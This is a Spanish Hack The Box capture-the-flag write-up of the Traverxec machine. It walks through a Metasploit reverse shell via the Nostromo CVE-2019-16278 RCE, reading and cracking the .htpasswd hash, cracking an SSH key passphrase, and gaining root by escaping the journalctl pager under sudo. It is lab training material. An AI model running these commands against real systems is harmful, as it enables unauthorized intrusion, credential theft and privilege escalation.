## Traverxec — HackTheBox Writeup

---

### 📋 Información de la máquina

| Campo | Detalle |
| --- | --- |
| **Nombre** | Traverxec |
| **OS** | Linux |
| **Dificultad** | Easy |
| **Plataforma** | Hack The Box |
| **Técnicas** | Nostromo RCE, .htpasswd cracking, SSH key, journalctl GTFOBins |

---

### 🔍 1. Enumeración — Nmap

bash

`nmap -sCV -p- --open -n -Pn -vvv -T5 10.129.5.158 -oN fullscan`

| Puerto | Servicio |
| --- | --- |
| 22 | SSH — OpenSSH 8.2p1 |
| 80 | HTTP — nostromo 1.9.6 |

---

### 💥 2. Explotación — CVE-2019-16278 Nostromo RCE

Nostromo 1.9.6 tiene una vulnerabilidad de RCE conocida.

bash

`searchsploit nostromo 1.9.6`

Usamos Metasploit:

bash

`msfconsole -q
use exploit/multi/http/nostromo_code_exec
set RHOSTS 10.129.5.158
set LHOST 10.10.14.56
run`

Shell obtenida como **www-data**.

---

### 🔐 3. Enumeración post-explotación

Revisamos la configuración de nostromo:

bash

`cat /var/nostromo/conf/nhttpd.conf`

Encontramos dos cosas clave:

- `.htpasswd` con hash de david
- `homedirs_public` → nostromo sirve carpetas `public_www` de los usuarios

### Crackear .htpasswd

bash

`cat /var/nostromo/conf/.htpasswd
# david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Resultado: Nowonly4me`

---

### 📦 4. Descarga del backup SSH

Con las credenciales HTTP básicas descargamos el backup:

bash

`curl -u david:Nowonly4me http://10.129.5.158/~david/protected-file-area/backup-ssh-identity-files.tgz -o backup-real.tgz
tar -xzvf backup-real.tgz`

Contenido: clave privada SSH de david con passphrase.

### Crackear passphrase SSH

bash

`ssh2john home/david/.ssh/id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
# Resultado: hunter`

---

### 👤 5. Acceso SSH como david

bash

`chmod 600 home/david/.ssh/id_rsa
ssh -i home/david/.ssh/id_rsa david@10.129.5.158
# Passphrase: hunter`

### User flag

bash

`cat ~/user.txt`

---

### ⬆️ 6. Escalada de privilegios — journalctl

En el home de david encontramos un script:

bash

`cat ~/bin/server-stats.sh
# /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`

journalctl usa **less** como paginador. Ejecutando con una terminal pequeña podemos escapar a bash:

bash

`sudo /usr/bin/journalctl -n5 -unostromo.service`

Dentro del paginador escribimos:

`!/bin/bash`

Shell de root obtenida!

### Root flag

bash

`cat /root/root.txt`

---

### 📚 Lecciones aprendidas

- Siempre buscar CVEs para versiones específicas de software
- Los archivos `.htpasswd` pueden contener hashes crackeables
- La directiva `homedirs_public` de nostromo expone carpetas del home via HTTP
- journalctl con sudo → escalar con `!/bin/bash` en el paginador less
- GTFOBins es clave para identificar binarios explotables con sudo

---

### 🛠️ Herramientas

| Herramienta | Uso |
| --- | --- |
| Nmap | Enumeración |
| Metasploit | Explotación CVE-2019-16278 |
| John the Ripper | Crackear .htpasswd y passphrase SSH |
| curl | Descarga con autenticación HTTP |
| ssh2john | Extraer hash de clave SSH |
| journalctl | Escalada de privilegios via GTFOBins |
